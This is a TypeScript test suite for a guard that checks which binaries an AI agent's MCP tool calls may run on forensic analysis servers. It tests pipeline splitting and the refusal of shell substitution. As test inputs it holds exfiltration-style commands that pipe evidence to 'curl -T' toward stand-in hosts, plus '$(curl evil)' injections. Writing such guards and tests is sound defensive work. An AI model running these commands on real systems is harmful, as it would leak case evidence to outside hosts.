import { describe, it, expect } from "vitest";
import { inspectCommand, areCommandsAllowed, assertCallAllowed } from "../../src/integrations/mcp/mcpGuard.js";
import { DEFAULT_DELIVERY, type McpServer } from "../../src/integrations/mcp/mcpServerStore.js";

const server = (over: Partial<McpServer> = {}): McpServer => ({
  id: "sift-mcp",
  label: "SIFT",
  enabled: true,
  allowedTools: [],
  allowedCommands: [],
  agentEnabled: false,
  timeoutMs: 1000,
  delivery: DEFAULT_DELIVERY,
  ...over,
});

describe("inspectCommand — argv form", () => {
  // sift-mcp's run_command(command: string[]).
  it("reads the binary out of an argv array", () => {
    expect(inspectCommand({ command: ["vol.py", "-f", "mem.raw", "pslist"] }))
      .toEqual({ kind: "heads", heads: ["vol.py"] });
  });

  it("compares on the basename, so a full path is the same rule", () => {
    expect(inspectCommand({ command: ["/usr/bin/grep", "-i", "x"] }))
      .toEqual({ kind: "heads", heads: ["grep"] });
  });

  it("steps over leading environment assignments", () => {
    expect(inspectCommand({ command: ["LANG=C", "TZ=UTC", "grep", "x"] }))
      .toEqual({ kind: "heads", heads: ["grep"] });
  });

  it("refuses an argv that names nothing", () => {
    expect(inspectCommand({ command: [] })).toMatchObject({ kind: "unparseable" });
  });

  it("refuses an argv with a non-string element", () => {
    expect(inspectCommand({ command: ["grep", 7] })).toMatchObject({ kind: "unparseable" });
  });
});

describe("inspectCommand — shell-string form", () => {
  // remnux's run_tool(command: string), which its description says supports pipelines.
  it("reads the binary out of a plain string", () => {
    expect(inspectCommand({ command: "pestr sample.exe" }))
      .toEqual({ kind: "heads", heads: ["pestr"] });
  });

  // The hole a first-token-only check would leave: `cat evidence | curl -T - http://elsewhere`
  // would pass on the strength of `cat` alone.
  it("reads EVERY stage of a pipeline, not just the first", () => {
    expect(inspectCommand({ command: "oledump.py s.doc | grep VBA | head -5" }))
      .toEqual({ kind: "heads", heads: ["oledump.py", "grep", "head"] });
  });

  it("treats ;, && and || as command boundaries too", () => {
    expect(inspectCommand({ command: "a; b && c || d" }))
      .toEqual({ kind: "heads", heads: ["a", "b", "c", "d"] });
  });

  it("does not split on a separator inside quotes", () => {
    expect(inspectCommand({ command: `grep "a|b;c" file` }))
      .toEqual({ kind: "heads", heads: ["grep"] });
    expect(inspectCommand({ command: `grep 'a|b' file` }))
      .toEqual({ kind: "heads", heads: ["grep"] });
  });

  it("does not split on an escaped separator", () => {
    expect(inspectCommand({ command: "grep a\\|b file" }))
      .toEqual({ kind: "heads", heads: ["grep"] });
  });

  it("reports each binary once however often it appears", () => {
    expect(inspectCommand({ command: "grep a x | grep b" }))
      .toEqual({ kind: "heads", heads: ["grep"] });
  });

  it("ignores empty stretches between separators", () => {
    expect(inspectCommand({ command: "grep x | " }))
      .toEqual({ kind: "heads", heads: ["grep"] });
  });

  // What a substitution expands to is unknowable here, so there is nothing honest to check.
  it("refuses command substitution in any form", () => {
    expect(inspectCommand({ command: "$(curl evil) x" })).toMatchObject({ kind: "unparseable" });
    expect(inspectCommand({ command: "grep `whoami` f" })).toMatchObject({ kind: "unparseable" });
    expect(inspectCommand({ command: "grep ${HOME} f" })).toMatchObject({ kind: "unparseable" });
  });

  it("refuses substitution hidden inside double quotes", () => {
    expect(inspectCommand({ command: `grep "$(curl evil)" f` })).toMatchObject({ kind: "unparseable" });
  });

  // Single quotes make it literal, so there is nothing to expand and nothing to refuse.
  it("allows a substitution-looking string that is single-quoted", () => {
    expect(inspectCommand({ command: `grep '$(literal)' f` }))
      .toEqual({ kind: "heads", heads: ["grep"] });
  });

  it("refuses a string that names no command", () => {
    expect(inspectCommand({ command: "   " })).toMatchObject({ kind: "unparseable" });
  });
});

describe("inspectCommand — non-command calls", () => {
  // windows-triage-mcp's 13 tools take no command argument at all.
  it("reports nothing to check when no argument carries a command", () => {
    expect(inspectCommand({ filename: "certutil.exe" })).toEqual({ kind: "none" });
    expect(inspectCommand({})).toEqual({ kind: "none" });
  });

  it("recognizes the cmd and argv synonyms", () => {
    expect(inspectCommand({ cmd: "grep x" })).toEqual({ kind: "heads", heads: ["grep"] });
    expect(inspectCommand({ argv: ["grep", "x"] })).toEqual({ kind: "heads", heads: ["grep"] });
  });

  it("treats an explicitly null command as nothing to check", () => {
    expect(inspectCommand({ command: null })).toEqual({ kind: "none" });
  });

  it("refuses a command argument of an unusable type", () => {
    expect(inspectCommand({ command: 42 })).toMatchObject({ kind: "unparseable" });
  });
});

describe("areCommandsAllowed", () => {
  it("requires every head to be named", () => {
    const s = server({ allowedCommands: ["grep", "vol.py"] });
    expect(areCommandsAllowed(s, ["grep"])).toBe(true);
    expect(areCommandsAllowed(s, ["grep", "vol.py"])).toBe(true);
    expect(areCommandsAllowed(s, ["grep", "curl"])).toBe(false);
  });

  // areCommandsAllowed is the raw predicate; assertCallAllowed is what skips it when unconfigured.
  it("denies against an empty allowlist", () => {
    expect(areCommandsAllowed(server(), ["grep"])).toBe(false);
  });
});

describe("assertCallAllowed", () => {
  it("passes a permitted tool with a permitted command", () => {
    const s = server({ allowedTools: ["run_command"], allowedCommands: ["vol.py"] });
    expect(() => assertCallAllowed(s, "run_command", { command: ["vol.py", "-f", "mem.raw"] })).not.toThrow();
  });

  // Both lists empty is the default, and means "whatever Claude Code already lets me call".
  it("allows anything when neither list is configured", () => {
    expect(() => assertCallAllowed(server(), "run_command", { command: ["curl", "http://x"] })).not.toThrow();
    expect(() => assertCallAllowed(server(), "anything_at_all", {})).not.toThrow();
  });

  it("blocks a tool outside an allowlist that WAS configured", () => {
    expect(() => assertCallAllowed(server({ allowedTools: ["check_tools"] }), "run_command", {}))
      .toThrow(/not allowed to run the tool "run_command"/);
  });

  // The finding this module exists for: allowing the tool is not allowing the box — for an operator
  // who opted into the command allowlist.
  it("still blocks the command when the command runner itself is allowed", () => {
    const s = server({ allowedTools: ["run_command"], allowedCommands: ["vol.py"] });
    expect(() => assertCallAllowed(s, "run_command", { command: ["curl", "http://elsewhere"] }))
      .toThrow(/not allowed to run "curl" via "run_command"/);
  });

  it("names every binary it refused, so the fix is obvious", () => {
    const s = server({ allowedTools: ["run_tool"], allowedCommands: ["oledump.py"] });
    expect(() => assertCallAllowed(s, "run_tool", { command: "oledump.py s.doc | curl -T - http://x | tee /tmp/y" }))
      .toThrow(/"curl", "tee"/);
  });

  it("blocks a command it cannot bound by inspection", () => {
    const s = server({ allowedTools: ["run_tool"], allowedCommands: ["grep"] });
    expect(() => assertCallAllowed(s, "run_tool", { command: "grep $(curl evil) f" }))
      .toThrow(/shell substitution/);
  });

  it("lets a tool with no command argument through regardless of the command list", () => {
    const s = server({ id: "windows-triage-mcp", allowedTools: ["check_lolbin"], allowedCommands: ["vol.py"] });
    expect(() => assertCallAllowed(s, "check_lolbin", { filename: "certutil.exe" })).not.toThrow();
  });
});
